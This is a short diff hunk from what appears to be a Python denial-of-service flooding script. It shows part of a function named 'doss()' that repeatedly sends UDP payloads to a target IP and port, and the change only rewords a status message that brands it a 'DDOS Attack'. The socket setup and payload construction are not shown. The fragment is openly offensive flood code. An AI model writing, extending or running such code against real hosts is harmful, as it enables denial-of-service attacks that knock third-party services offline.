@@ -73,7 +73,7 @@ def doss():
                 pass
             sock.sendto(payloads,(ip,port))
             sent = sent + 1 
-            print (gr+' Attack starting on %s .... DDOS Attack By Virooous') % (ip)
+            print (gr+' Attacking on %s .... ') % (ip)
         except KeyboardInterrupt:
             sys.exit()
 
